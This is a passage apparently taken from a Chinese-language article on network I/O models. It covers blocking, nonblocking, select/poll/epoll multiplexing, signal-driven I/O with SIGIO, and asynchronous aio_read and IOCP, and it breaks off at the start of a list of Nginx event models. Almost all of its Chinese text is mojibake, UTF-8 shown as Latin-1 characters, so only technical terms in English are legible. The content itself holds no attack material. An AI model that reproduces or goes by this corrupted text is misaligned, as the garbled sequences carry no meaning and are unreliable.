¸ç­‰åˆ°æ•°æ®åŒ…åˆ°è¾¾åï¼Œç„¶åå°†æ¥æ”¶çš„æ•°æ®æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå®Œæˆreadæ“ä½œã€‚\nç”¨æˆ·éœ€è¦ç­‰å¾…readå°†æ•°æ®è¯»å–åˆ°bufferåï¼Œæ‰ç»§ç»­å¤„ç†æ¥æ”¶çš„æ•°æ®ã€‚æ•´ä¸ªI/Oè¯·æ±‚çš„è¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·çº¿ç¨‹æ˜¯è¢«é˜»å¡çš„ï¼Œè¿™å¯¼è‡´ç”¨æˆ·åœ¨å‘èµ·IOè¯·æ±‚æ—¶ï¼Œä¸èƒ½åšä»»ä½•äº‹æƒ…ï¼Œå¯¹CPUçš„èµ„æºåˆ©ç”¨ç‡ä¸å¤Ÿã€‚\nä¼˜ç‚¹ï¼šç¨‹åºç®€å•ï¼Œåœ¨é˜»å¡ç­‰å¾…æ•°æ®æœŸé—´è¿›ç¨‹/çº¿ç¨‹æŒ‚èµ·ï¼ŒåŸºæœ¬ä¸ä¼šå ç”¨ CPU èµ„æºã€‚\nç¼ºç‚¹ï¼šæ¯ä¸ªè¿æ¥éœ€è¦ç‹¬ç«‹çš„è¿›ç¨‹/çº¿ç¨‹å•ç‹¬å¤„ç†ï¼Œå½“å¹¶å‘è¯·æ±‚é‡å¤§æ—¶ä¸ºäº†ç»´æŠ¤ç¨‹åºï¼Œå†…å­˜ã€çº¿ç¨‹åˆ‡æ¢å¼€é”€è¾ƒå¤§ã€‚\nåŒæ­¥é˜»å¡ï¼šç¨‹åºå‘å†…æ ¸å‘é€I/Oè¯·æ±‚åä¸€ç›´ç­‰å¾…å†…æ ¸å“åº”ï¼Œå¦‚æœå†…æ ¸å¤„ç†è¯·æ±‚çš„IOæ“ä½œä¸èƒ½ç«‹å³è¿”å›, åˆ™è¿›ç¨‹å°†ä¸€ç›´ç­‰å¾…å¹¶ä¸å†æ¥å—æ–°çš„è¯·æ±‚ï¼Œå¹¶ç”±è¿›ç¨‹è½®è¯¢æŸ¥çœ‹I/Oæ˜¯å¦å®Œæˆï¼Œå®Œæˆåè¿›ç¨‹å°†I/Oç»“æœè¿”å›ç»™Clientï¼Œåœ¨IOæ²¡æœ‰è¿”å›æœŸé—´è¿›ç¨‹ä¸èƒ½æ¥å—å…¶ä»–å®¢æˆ·çš„è¯·æ±‚ï¼Œè€Œä¸”æ˜¯ç”±è¿›ç¨‹è‡ªå·±å»æŸ¥çœ‹I/Oæ˜¯å¦å®Œæˆï¼Œè¿™ç§æ–¹å¼ç®€å•ï¼Œä½†æ˜¯æ¯”è¾ƒæ…¢ï¼Œç”¨çš„æ¯”è¾ƒå°‘ã€‚ éé˜»å¡ I/O æ¨¡å‹ï¼ˆnonblocking IOï¼‰ ç”¨æˆ·çº¿ç¨‹å‘èµ·IOè¯·æ±‚æ—¶ç«‹å³è¿”å›ã€‚ä½†å¹¶æœªè¯»å–åˆ°ä»»ä½•æ•°æ®ï¼Œç”¨æˆ·çº¿ç¨‹éœ€è¦ä¸æ–­åœ°å‘èµ·IOè¯·æ±‚ï¼Œç›´åˆ°æ•°æ®åˆ°è¾¾åï¼Œæ‰çœŸæ­£è¯»å–åˆ°æ•°æ®ï¼Œç»§ç»­æ‰§è¡Œã€‚å³ â€œè½®è¯¢â€æœºåˆ¶å­˜åœ¨ä¸¤ä¸ªé—®é¢˜ï¼šå¦‚æœæœ‰å¤§é‡æ–‡ä»¶æè¿°ç¬¦éƒ½è¦ç­‰ï¼Œé‚£ä¹ˆå°±å¾—ä¸€ä¸ªä¸€ä¸ªreadã€‚è¿™ä¼šå¸¦æ¥å¤§é‡çš„Context Switchï¼ˆreadæ˜¯ç³»ç»Ÿè°ƒç”¨ï¼Œæ¯è°ƒç”¨ä¸€æ¬¡å°±å¾—åœ¨ç”¨æˆ·æ€å’Œæ ¸å¿ƒæ€åˆ‡æ¢ä¸€æ¬¡ï¼‰ã€‚è½®è¯¢çš„æ—¶é—´ä¸å¥½æŠŠæ¡ã€‚è¿™é‡Œéœ€è¦ä¼°è®¡æ•°æ®éœ€è¦å¤šä¹…ä¹‹åæ‰èƒ½å‡†å¤‡å¥½ã€‚ç­‰å¾…æ—¶é—´è®¾çš„å¤ªé•¿ï¼Œç¨‹åºå“åº”å»¶è¿Ÿå°±è¿‡å¤§; è®¾çš„å¤ªçŸ­ï¼Œå°±ä¼šé€ æˆè¿‡äºé¢‘ç¹çš„é‡è¯•ï¼Œå¹²è€—CPUè€Œå·²ï¼Œæ˜¯æ¯”è¾ƒæµªè´¹CPUçš„æ–¹å¼ï¼Œä¸€èˆ¬å¾ˆå°‘ç›´æ¥ä½¿ç”¨è¿™ç§æ¨¡å‹ï¼Œè€Œæ˜¯åœ¨å…¶ä»–IOæ¨¡å‹ä¸­ä½¿ç”¨éé˜»å¡IOè¿™ä¸€ç‰¹æ€§ã€‚\néé˜»å¡ï¼šç¨‹åºå‘å†…æ ¸å‘é€è¯·I/Oæ±‚åä¸€ç›´ç­‰å¾…å†…æ ¸å“åº”ï¼Œå¦‚æœå†…æ ¸å¤„ç†è¯·æ±‚çš„IOæ“ä½œä¸èƒ½ç«‹å³è¿”å›IOç»“æœï¼Œè¿›ç¨‹å°†ä¸å†ç­‰å¾…ï¼Œè€Œæ˜¯ç»§ç»­å¤„ç†å…¶ä»–è¯·æ±‚ï¼Œä½†æ˜¯ä»ç„¶éœ€è¦è¿›ç¨‹éš”ä¸€æ®µæ—¶é—´å°±è¦æŸ¥çœ‹å†…æ ¸I/Oæ˜¯å¦å®Œæˆã€‚ ç”±ä¸Šå›¾å¯çŸ¥ï¼Œåœ¨è®¾ç½®è¿æ¥ä¸ºéé˜»å¡æ—¶ï¼Œå½“åº”ç”¨è¿›ç¨‹ç³»ç»Ÿè°ƒç”¨ recvfrom æ²¡æœ‰æ•°æ®è¿”å›æ—¶ï¼Œå†…æ ¸ä¼šç«‹å³è¿”å›ä¸€ä¸ª EWOULDBLOCK é”™è¯¯ï¼Œè€Œä¸ä¼šä¸€ç›´é˜»å¡åˆ°æ•°æ®å‡†å¤‡å¥½ã€‚å¦‚ä¸Šå›¾åœ¨ç¬¬å››æ¬¡è°ƒç”¨æ—¶æœ‰ä¸€ä¸ªæ•°æ®æŠ¥å‡†å¤‡å¥½äº†ï¼Œæ‰€ä»¥è¿™æ—¶æ•°æ®ä¼šè¢«å¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹ç¼“å†²åŒº ï¼Œäºæ˜¯ recvfrom æˆåŠŸè¿”å›æ•°æ®ã€‚\nå½“ä¸€ä¸ªåº”ç”¨è¿›ç¨‹è¿™æ ·å¾ªç¯è°ƒç”¨ recvfrom æ—¶ï¼Œç§°ä¹‹ä¸ºè½®è¯¢ polling ã€‚è¿™ä¹ˆåšå¾€å¾€ä¼šè€—è´¹å¤§é‡CPUæ—¶é—´ï¼Œè¿™ç§æ¨¡å‹å®é™…å¾ˆå°‘è¢«ä½¿ç”¨ã€‚\nå¤šè·¯å¤ç”¨ I/O æ¨¡ å‹ï¼ˆ I/O multiplexing ï¼‰ ä¸Šé¢çš„æ¨¡å‹ä¸­, æ¯ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦å¯¹åº”çš„IOå‡ç”±ä¸€ä¸ªçº¿ç¨‹ç›‘æ§å’Œå¤„ç†ï¼ˆæœ‰å¤šå°‘æ–‡ä»¶æè¿°ç¬¦å°±è¦ç”Ÿæˆå¤šå°‘ä¸ªçº¿ç¨‹ï¼‰\nå¤šè·¯å¤ç”¨IOæŒ‡ä¸€ä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶ï¼ˆå®é™…æ˜¯äº¤æ›¿å®ç°ï¼Œå³å¹¶å‘å®Œæˆï¼‰ç›‘æ§å’Œå¤„ç†å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦å¯¹åº”å„è‡ªçš„IOï¼Œå³å¤ç”¨åŒä¸€ä¸ªçº¿ç¨‹\nä¸€ä¸ªçº¿ç¨‹ä¹‹æ‰€ä»¥èƒ½å®ç°åŒæ—¶å¤„ç†å¤šä¸ªIO, æ˜¯å› ä¸ºè¿™ä¸ªçº¿ç¨‹è°ƒç”¨äº†å†…æ ¸ä¸­çš„SELECT, POLLæˆ–EPOLLç­‰ç³»ç»Ÿè°ƒç”¨ï¼Œä»è€Œå®ç°å¤šè·¯å¤ç”¨IO\nI/O multiplexing ä¸»è¦åŒ…æ‹¬:selectï¼Œpollï¼Œepollä¸‰ç§ç³»ç»Ÿè°ƒç”¨ï¼Œselect/poll/epollçš„å¥½å¤„å°±åœ¨äºå•ä¸ªprocessï¼ˆè¿›ç¨‹ï¼‰å°±å¯ä»¥åŒæ—¶å¤„ç†å¤šä¸ªç½‘ç»œè¿æ¥çš„IOã€‚\nå®ƒçš„åŸºæœ¬åŸç†å°±æ˜¯select/poll/epollè¿™ä¸ªfunctionä¼šä¸æ–­çš„è½®è¯¢æ‰€è´Ÿè´£çš„æ‰€æœ‰socketï¼Œå½“æŸä¸ªsocketæœ‰æ•°æ®åˆ°è¾¾äº†ï¼Œå°±é€šçŸ¥ç”¨æˆ·è¿›ç¨‹ã€‚\nå½“ç”¨æˆ·è¿›ç¨‹è°ƒç”¨äº†selectï¼Œé‚£ä¹ˆæ•´ä¸ªè¿›ç¨‹ä¼šè¢«blockï¼Œè€ŒåŒæ—¶ï¼Œkernelä¼šâ€œç›‘è§†â€æ‰€æœ‰selectè´Ÿè´£çš„socketï¼Œå½“ä»»ä½•ä¸€ä¸ªsocketä¸­çš„æ•°æ®å‡†å¤‡å¥½äº†ï¼Œselectå°±ä¼šè¿”å›ã€‚è¿™ä¸ªæ—¶å€™ç”¨æˆ·è¿›ç¨‹å†è°ƒç”¨readæ“ä½œï¼Œå°†æ•°æ®ä»kernelæ‹·è´åˆ°ç”¨æˆ·è¿›ç¨‹ã€‚\nIOå¤šè·¯å¤ç”¨ï¼ˆIO Multiplexing) ï¼šæ˜¯ä¸€ç§æœºåˆ¶ï¼Œç¨‹åºæ³¨å†Œä¸€ç»„socketæ–‡ä»¶æè¿°ç¬¦ç»™æ“ä½œç³»ç»Ÿï¼Œè¡¨ç¤ºâ€œæˆ‘è¦ç›‘è§†è¿™äº›fdæ˜¯å¦æœ‰IOäº‹ä»¶å‘ç”Ÿï¼Œæœ‰äº†å°±å‘Šè¯‰ç¨‹åºå¤„ç†â€ï¼› IOå¤šè·¯å¤ç”¨ä¸€èˆ¬å’ŒNIOï¼ˆnonblocking IOï¼‰ä¸€èµ·ä½¿ç”¨çš„ã€‚NIOå’ŒIOå¤šè·¯å¤ç”¨æ˜¯ç›¸å¯¹ç‹¬ç«‹çš„ã€‚NIOä»…ä»…æ˜¯æŒ‡IO APIæ€»æ˜¯èƒ½ç«‹åˆ»è¿”å›ï¼Œä¸ä¼šè¢«Blocking; è€ŒIOå¤šè·¯å¤ç”¨ä»…ä»…æ˜¯æ“ä½œç³»ç»Ÿæä¾›çš„ä¸€ç§ä¾¿åˆ©çš„é€šçŸ¥æœºåˆ¶ã€‚æ“ä½œç³»ç»Ÿå¹¶ä¸ä¼šå¼ºåˆ¶è¿™ä¿©å¿…é¡»å¾—ä¸€èµ·ç”¨ï¼Œå¯ä»¥åªç”¨IOå¤šè·¯å¤ç”¨ + BIOï¼ˆblocking IOï¼‰ï¼Œè¿™æ—¶è¿˜æ˜¯å½“å‰çº¿ç¨‹è¢«å¡ä½ã€‚IOå¤šè·¯å¤ç”¨å’ŒNIOæ˜¯è¦é…åˆä¸€èµ·ä½¿ç”¨æ‰æœ‰å®é™…æ„ä¹‰ï¼› IOå¤šè·¯å¤ç”¨æ˜¯æŒ‡å†…æ ¸ä¸€æ—¦å‘ç°è¿›ç¨‹æŒ‡å®šçš„ä¸€ä¸ªæˆ–è€…å¤šä¸ªIOæ¡ä»¶å‡†å¤‡å°±ç»ªï¼Œå°±é€šçŸ¥è¯¥è¿›ç¨‹ï¼› å¤šä¸ªè¿æ¥å…±ç”¨ä¸€ä¸ªç­‰å¾…æœºåˆ¶ï¼Œæœ¬æ¨¡å‹ä¼šé˜»å¡è¿›ç¨‹ï¼Œä½†æ˜¯è¿›ç¨‹æ˜¯é˜»å¡åœ¨selectæˆ–è€…pollè¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ä¸Šï¼Œè€Œä¸æ˜¯é˜»å¡åœ¨çœŸæ­£çš„IOæ“ä½œä¸Šï¼› ç”¨æˆ·é¦–å…ˆå°†éœ€è¦è¿›è¡ŒIOæ“ä½œæ·»åŠ åˆ°selectä¸­ï¼ŒåŒæ—¶ç­‰å¾…selectç³»ç»Ÿè°ƒç”¨è¿”å›ã€‚å½“æ•°æ®åˆ°è¾¾æ—¶ï¼ŒIOè¢«æ¿€æ´»ï¼Œselectå‡½æ•°è¿”å›ã€‚ç”¨æˆ·çº¿ç¨‹æ­£å¼å‘èµ·readè¯·æ±‚ï¼Œè¯»å–æ•°æ®å¹¶ç»§ç»­æ‰§è¡Œï¼› ä»æµç¨‹ä¸Šæ¥çœ‹ï¼Œä½¿ç”¨selectå‡½æ•°è¿›è¡ŒIOè¯·æ±‚å’ŒåŒæ­¥é˜»å¡æ¨¡å‹æ²¡æœ‰å¤ªå¤§çš„åŒºåˆ«ï¼Œç”šè‡³è¿˜å¤šäº†æ·»åŠ ç›‘è§†IOï¼Œä»¥åŠè°ƒç”¨selectå‡½æ•°çš„é¢å¤–æ“ä½œï¼Œæ•ˆç‡æ›´å·®ã€‚å¹¶ä¸”é˜»å¡äº†ä¸¤æ¬¡ï¼Œä½†æ˜¯ç¬¬ä¸€æ¬¡é˜»å¡åœ¨selectä¸Šæ—¶ï¼Œselectå¯ä»¥ç›‘æ§å¤šä¸ªIOä¸Šæ˜¯å¦å·²æœ‰IOæ“ä½œå‡†å¤‡å°±ç»ªï¼Œå³å¯è¾¾åˆ°åœ¨åŒä¸€ä¸ªçº¿ç¨‹å†…åŒæ—¶å¤„ç†å¤šä¸ªIOè¯·æ±‚çš„ç›®çš„ã€‚è€Œä¸åƒé˜»å¡IOé‚£ç§ï¼Œä¸€æ¬¡åªèƒ½ç›‘æ§ä¸€ä¸ªIOï¼› è™½ç„¶ä¸Šè¿°æ–¹å¼å…è®¸å•çº¿ç¨‹å†…å¤„ç†å¤šä¸ªIOè¯·æ±‚ï¼Œä½†æ˜¯æ¯ä¸ªIOè¯·æ±‚çš„è¿‡ç¨‹è¿˜æ˜¯é˜»å¡çš„ï¼ˆåœ¨selectå‡½æ•°ä¸Šé˜»å¡ï¼‰ï¼Œå¹³å‡æ—¶é—´ç”šè‡³æ¯”åŒæ­¥é˜»å¡IOæ¨¡å‹è¿˜è¦é•¿ã€‚å¦‚æœç”¨æˆ·çº¿ç¨‹åªæ˜¯æ³¨å†Œè‡ªå·±éœ€è¦çš„IOè¯·æ±‚ï¼Œç„¶åå»åšè‡ªå·±çš„äº‹æƒ…ï¼Œç­‰åˆ°æ•°æ®åˆ°æ¥æ—¶å†è¿›è¡Œå¤„ç†ï¼Œåˆ™å¯ä»¥æé«˜CPUçš„åˆ©ç”¨ç‡ï¼› IOå¤šè·¯å¤ç”¨æ˜¯æœ€å¸¸ä½¿ç”¨çš„IOæ¨¡å‹ï¼Œä½†æ˜¯å…¶å¼‚æ­¥ç¨‹åº¦è¿˜ä¸å¤Ÿâ€œå½»åº•â€ï¼Œå› å®ƒä½¿ç”¨äº†ä¼šé˜»å¡çº¿ç¨‹çš„selectç³»ç»Ÿè°ƒç”¨ã€‚å› æ­¤IOå¤šè·¯å¤ç”¨åªèƒ½ç§°ä¸ºå¼‚æ­¥é˜»å¡IOæ¨¡å‹ï¼Œè€ŒéçœŸæ­£çš„å¼‚æ­¥IOï¼› ä¼˜ç¼ºç‚¹\nä¼˜ç‚¹ï¼šå¯ä»¥åŸºäºä¸€ä¸ªé˜»å¡å¯¹è±¡ï¼ŒåŒæ—¶åœ¨å¤šä¸ªæè¿°ç¬¦ä¸Šç­‰å¾…å°±ç»ªï¼Œè€Œä¸æ˜¯ä½¿ç”¨å¤šä¸ªçº¿ç¨‹(æ¯ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸€ä¸ªçº¿ç¨‹)ï¼Œè¿™æ ·å¯ä»¥å¤§å¤§èŠ‚çœç³»ç»Ÿèµ„æº ç¼ºç‚¹ï¼šå½“è¿æ¥æ•°è¾ƒå°‘æ—¶æ•ˆç‡ç›¸æ¯”å¤šçº¿ç¨‹+é˜»å¡ I/O æ¨¡å‹æ•ˆç‡è¾ƒä½ï¼Œå¯èƒ½å»¶è¿Ÿæ›´å¤§ï¼Œå› ä¸ºå•ä¸ªè¿æ¥å¤„ç†éœ€è¦ 2 æ¬¡ç³»ç»Ÿè°ƒç”¨ï¼ˆselectå’Œrecvfromï¼‰ï¼Œå ç”¨æ—¶é—´ä¼šæœ‰å¢åŠ  IOå¤šè·¯å¤ç”¨é€‚ç”¨å¦‚ä¸‹åœºåˆï¼š\nå½“å®¢æˆ·ç«¯å¤„ç†å¤šä¸ªæè¿°ç¬¦æ—¶ï¼ˆä¸€èˆ¬æ˜¯äº¤äº’å¼è¾“å…¥å’Œç½‘ç»œå¥—æ¥å£ï¼‰ï¼Œå¿…é¡»ä½¿ç”¨I/Oå¤ç”¨ å½“ä¸€ä¸ªå®¢æˆ·ç«¯åŒæ—¶å¤„ç†å¤šä¸ªå¥—æ¥å­—æ—¶ï¼Œæ­¤æƒ…å†µå¯èƒ½çš„ä½†å¾ˆå°‘å‡ºç° å½“ä¸€ä¸ªæœåŠ¡å™¨æ—¢è¦å¤„ç†ç›‘å¬å¥—æ¥å­—ï¼Œåˆè¦å¤„ç†å·²è¿æ¥å¥—æ¥å­—ï¼Œä¸€èˆ¬ä¹Ÿè¦ç”¨åˆ°I/Oå¤ç”¨ å½“ä¸€ä¸ªæœåŠ¡å™¨å³è¦å¤„ç†TCPï¼Œåˆè¦å¤„ç†UDPï¼Œä¸€èˆ¬è¦ä½¿ç”¨I/Oå¤ç”¨ å½“ä¸€ä¸ªæœåŠ¡å™¨è¦å¤„ç†å¤šä¸ªæœåŠ¡æˆ–å¤šä¸ªåè®®ï¼Œä¸€èˆ¬è¦ä½¿ç”¨I/Oå¤ç”¨ ä¿¡å·é©±åŠ¨å¼ I/O æ¨¡å‹ï¼ˆsignal-driven IOï¼‰ ä¿¡å·é©±åŠ¨I/Oçš„æ„æ€å°±æ˜¯è¿›ç¨‹ç°åœ¨ä¸ç”¨å‚»ç­‰ç€ï¼Œä¹Ÿä¸ç”¨å»è½®è¯¢ã€‚è€Œæ˜¯è®©å†…æ ¸åœ¨æ•°æ®å°±ç»ªæ—¶ï¼Œå‘é€ä¿¡å·é€šçŸ¥è¿›ç¨‹ã€‚\nè°ƒç”¨çš„æ­¥éª¤æ˜¯ï¼Œé€šè¿‡ç³»ç»Ÿè°ƒç”¨ sigaction ï¼Œå¹¶æ³¨å†Œä¸€ä¸ªä¿¡å·å¤„ç†çš„å›è°ƒå‡½æ•°ï¼Œè¯¥è°ƒç”¨ä¼šç«‹å³è¿”å›ï¼Œç„¶åä¸»ç¨‹åºå¯ä»¥ç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œå½“æœ‰I/Oæ“ä½œå‡†å¤‡å°±ç»ª,å³å†…æ ¸æ•°æ®å°±ç»ªæ—¶ï¼Œå†…æ ¸ä¼šä¸ºè¯¥è¿›ç¨‹äº§ç”Ÿä¸€ä¸ª SIGIOä¿¡å·ï¼Œå¹¶å›è°ƒæ³¨å†Œçš„ä¿¡å·å›è°ƒå‡½æ•°ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ä¿¡å·å›è°ƒå‡½æ•°ä¸­ç³»ç»Ÿè°ƒç”¨ recvfrom è·å–æ•°æ®,å°†ç”¨æˆ·è¿›ç¨‹æ‰€éœ€è¦çš„æ•°æ®ä»å†…æ ¸ç©ºé—´æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ã€‚æ­¤æ¨¡å‹çš„ä¼˜åŠ¿åœ¨äºç­‰å¾…æ•°æ®æŠ¥åˆ°è¾¾æœŸé—´è¿›ç¨‹ä¸è¢«é˜»å¡ã€‚ç”¨æˆ·ä¸»ç¨‹åºå¯ä»¥ç»§ç»­æ‰§è¡Œï¼Œåªè¦ç­‰å¾…æ¥è‡ªä¿¡å·å¤„ç†å‡½æ•°çš„é€šçŸ¥ã€‚\nåœ¨ä¿¡å·é©±åŠ¨å¼ I/O æ¨¡å‹ä¸­ï¼Œåº”ç”¨ç¨‹åºä½¿ç”¨å¥—æ¥å£è¿›è¡Œä¿¡å·é©±åŠ¨ I/Oï¼Œå¹¶æ³¨å†Œä¸€ä¸ªä¿¡å·å¤„ç†å‡½æ•°ï¼Œè¿›ç¨‹ç»§ç»­è¿è¡Œå¹¶ä¸é˜»å¡ï¼Œå½“æ•°æ®å‡†å¤‡å¥½æ—¶ï¼Œè¿›ç¨‹ä¼šæ”¶åˆ°ä¸€ä¸ª SIGIO ä¿¡å·ï¼Œå¯ä»¥åœ¨ä¿¡å·å¤„ç†å‡½æ•°ä¸­è°ƒç”¨ I/O æ“ä½œå‡½æ•°å¤„ç†æ•°æ®ã€‚\nä¼˜ç‚¹ï¼šçº¿ç¨‹å¹¶æ²¡æœ‰åœ¨ç­‰å¾…æ•°æ®æ—¶è¢«é˜»å¡ï¼Œå†…æ ¸ç›´æ¥è¿”å›è°ƒç”¨æ¥æ”¶ä¿¡å·ï¼Œä¸å½±å“è¿›ç¨‹ç»§ç»­å¤„ç†å…¶ä»–è¯·æ±‚å› æ­¤å¯ä»¥æé«˜èµ„æºçš„åˆ©ç”¨ç‡ã€‚\nç¼ºç‚¹ï¼šä¿¡å· I/O åœ¨å¤§é‡ IO æ“ä½œæ—¶å¯èƒ½ä¼šå› ä¸ºä¿¡å·é˜Ÿåˆ—æº¢å‡ºå¯¼è‡´æ²¡æ³•é€šçŸ¥ã€‚\nå¼‚æ­¥é˜»å¡ï¼šç¨‹åºè¿›ç¨‹å‘å†…æ ¸å‘é€IOè°ƒç”¨åï¼Œä¸ç”¨ç­‰å¾…å†…æ ¸å“åº”ï¼Œå¯ä»¥ç»§ç»­æ¥å—å…¶ä»–è¯·æ±‚ï¼Œå†…æ ¸æ”¶åˆ°è¿›ç¨‹è¯·æ±‚åè¿›è¡Œçš„IOå¦‚æœä¸èƒ½ç«‹å³è¿”å›ï¼Œå°±ç”±å†…æ ¸ç­‰å¾…ç»“æœï¼Œç›´åˆ°IOå®Œæˆåå†…æ ¸å†é€šçŸ¥è¿›ç¨‹ã€‚ å¼‚æ­¥ I/O æ¨¡å‹ï¼ˆ asynchronous IO ï¼‰ å¼‚æ­¥I/O ä¸ ä¿¡å·é©±åŠ¨I/Oæœ€å¤§åŒºåˆ«åœ¨äºï¼Œä¿¡å·é©±åŠ¨æ˜¯å†…æ ¸é€šçŸ¥ç”¨æˆ·è¿›ç¨‹ä½•æ—¶å¼€å§‹ä¸€ä¸ªI/Oæ“ä½œï¼Œè€Œå¼‚æ­¥I/Oæ˜¯ç”±å†…æ ¸é€šçŸ¥ç”¨æˆ·è¿›ç¨‹I/Oæ“ä½œä½•æ—¶å®Œæˆï¼Œä¸¤è€…æœ‰æœ¬è´¨åŒºåˆ«åœ¨äºå¼‚æ­¥IOç›¸å½“äºä¸ç”¨å»é¥­åº—åœºåƒé¥­ï¼Œç›´æ¥ç‚¹ä¸ªå¤–å–ï¼ŒæŠŠç­‰å¾…ä¸Šèœçš„æ—¶é—´ä¹Ÿç»™çœäº†ã€‚\nç›¸å¯¹äºåŒæ­¥I/Oï¼Œå¼‚æ­¥I/Oä¸æ˜¯é¡ºåºæ‰§è¡Œã€‚ç”¨æˆ·è¿›ç¨‹è¿›è¡Œaio_readç³»ç»Ÿè°ƒç”¨ä¹‹åï¼Œæ— è®ºå†…æ ¸æ•°æ®æ˜¯å¦å‡†å¤‡å¥½ï¼Œéƒ½ä¼šç›´æ¥è¿”å›ç»™ç”¨æˆ·è¿›ç¨‹ï¼Œç„¶åç”¨æˆ·æ€è¿›ç¨‹å¯ä»¥å»åšåˆ«çš„äº‹æƒ…ã€‚ç­‰åˆ°socketæ•°æ®å‡†å¤‡å¥½äº†ï¼Œå†…æ ¸ç›´æ¥å¤åˆ¶æ•°æ®ç»™è¿›ç¨‹ï¼Œç„¶åä»å†…æ ¸å‘è¿›ç¨‹å‘é€é€šçŸ¥ã€‚IOä¸¤ä¸ªé˜¶æ®µï¼Œè¿›ç¨‹éƒ½æ˜¯éé˜»å¡çš„ã€‚\nä¿¡å·é©±åŠ¨IOå½“å†…æ ¸é€šçŸ¥è§¦å‘ä¿¡å·å¤„ç†ç¨‹åºæ—¶ï¼Œä¿¡å·å¤„ç†ç¨‹åºè¿˜éœ€è¦é˜»å¡åœ¨ä»å†…æ ¸ç©ºé—´ç¼“å†²åŒºæ‹·è´æ•°æ®åˆ°ç”¨æˆ·ç©ºé—´ç¼“å†²åŒºè¿™ä¸ªé˜¶æ®µï¼Œè€Œå¼‚æ­¥IOç›´æ¥æ˜¯åœ¨ç¬¬äºŒä¸ªé˜¶æ®µå®Œæˆåï¼Œå†…æ ¸ç›´æ¥é€šçŸ¥ç”¨æˆ·çº¿ç¨‹å¯ä»¥è¿›è¡Œåç»­æ“ä½œäº†\nä¼˜ç‚¹ï¼šå¼‚æ­¥ I/O èƒ½å¤Ÿå……åˆ†åˆ©ç”¨ DMA ç‰¹æ€§ï¼Œè®© I/O æ“ä½œä¸è®¡ç®—é‡å \nç¼ºç‚¹ï¼šè¦å®ç°çœŸæ­£çš„å¼‚æ­¥ I/Oï¼Œæ“ä½œç³»ç»Ÿéœ€è¦åšå¤§é‡çš„å·¥ä½œã€‚ç›®å‰ Windows ä¸‹é€šè¿‡ IOCP å®ç°äº†çœŸæ­£çš„å¼‚æ­¥ I/Oï¼Œåœ¨ Linux ç³»ç»Ÿä¸‹ï¼ŒLinux 2.6æ‰å¼•å…¥ï¼Œç›®å‰ AIO å¹¶ä¸å®Œå–„ï¼Œå› æ­¤åœ¨ Linux ä¸‹å®ç°é«˜å¹¶å‘ç½‘ç»œç¼–ç¨‹æ—¶ä»¥ IO å¤ç”¨æ¨¡å‹æ¨¡å¼+å¤šçº¿ç¨‹ä»»åŠ¡çš„æ¶æ„åŸºæœ¬å¯ä»¥æ»¡è¶³éœ€æ±‚\nLinuxæä¾›äº†AIOåº“å‡½æ•°å®ç°å¼‚æ­¥ï¼Œä½†æ˜¯ç”¨çš„å¾ˆå°‘ã€‚ç›®å‰æœ‰å¾ˆå¤šå¼€æºçš„å¼‚æ­¥IOåº“ï¼Œä¾‹å¦‚libeventã€libevã€libuvã€‚\nå¼‚æ­¥éé˜»å¡ï¼šç¨‹åºè¿›ç¨‹å‘å†…æ ¸å‘é€IOè°ƒç”¨åï¼Œä¸ç”¨ç­‰å¾…å†…æ ¸å“åº”ï¼Œå¯ä»¥ç»§ç»­æ¥å—å…¶ä»–è¯·æ±‚ï¼Œå†…æ ¸è°ƒç”¨çš„IOå¦‚æœä¸èƒ½ç«‹å³è¿”å›ï¼Œå†…æ ¸ä¼šç»§ç»­å¤„ç†å…¶ä»–äº‹ç‰©ï¼Œç›´åˆ°IOå®Œæˆåå°†ç»“æœé€šçŸ¥ç»™å†…æ ¸ï¼Œå†…æ ¸åœ¨å°†IOå®Œæˆçš„ç»“æœè¿”å›ç»™è¿›ç¨‹ï¼ŒæœŸé—´è¿›ç¨‹å¯ä»¥æ¥å—æ–°çš„è¯·æ±‚ï¼Œå†…æ ¸ä¹Ÿå¯ä»¥å¤„ç†æ–°çš„äº‹ç‰©ï¼Œå› æ­¤ç›¸äº’ä¸å½±å“ï¼Œå¯ä»¥å®ç°è¾ƒå¤§çš„åŒæ—¶å¹¶å®ç°è¾ƒé«˜çš„IOå¤ç”¨ï¼Œå› æ­¤å¼‚æ­¥éé˜»å¡æ˜¯ä½¿ç”¨æœ€å¤šçš„ä¸€ç§é€šä¿¡æ–¹å¼ã€‚ äº”ç§ IO å¯¹æ¯” è¿™äº”ç§ I/O æ¨¡å‹ä¸­ï¼Œè¶Šå¾€åï¼Œé˜»å¡è¶Šå°‘ï¼Œç†è®ºä¸Šæ•ˆç‡ä¹Ÿæ˜¯æœ€ä¼˜å‰å››ç§å±äºåŒæ­¥ I/Oï¼Œå› ä¸ºå…¶ä¸­çœŸæ­£çš„ I/O æ“ä½œ(recvfrom)å°†é˜»å¡è¿›ç¨‹/çº¿ç¨‹ï¼Œåªæœ‰å¼‚æ­¥ I/O æ¨¡å‹æ‰ä¸ POSIX å®šä¹‰çš„å¼‚æ­¥ I/O ç›¸åŒ¹é…ã€‚\nI/O çš„å…·ä½“å®ç°æ–¹å¼ I/O å¸¸è§å®ç° Nginxæ”¯æŒåœ¨å¤šç§ä¸åŒçš„æ“ä½œç³»ç»Ÿå®ç°ä¸åŒçš„äº‹ä»¶é©±åŠ¨æ¨¡å‹ï¼Œä½†æ˜¯å…¶åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿç”šè‡³æ˜¯ä¸åŒçš„ç³»ç»Ÿç‰ˆæœ¬ä¸Šé¢çš„å®ç°æ–¹å¼ä¸å°½ç›¸åŒï¼Œä¸»è¦æœ‰ä»¥ä¸‹å®ç°æ–¹å¼ï¼š\n1ã€selectï¼š selectåº“æ˜¯åœ¨linuxå’Œwindowså¹³å°éƒ½åŸºæœ¬æ”¯æŒçš„ 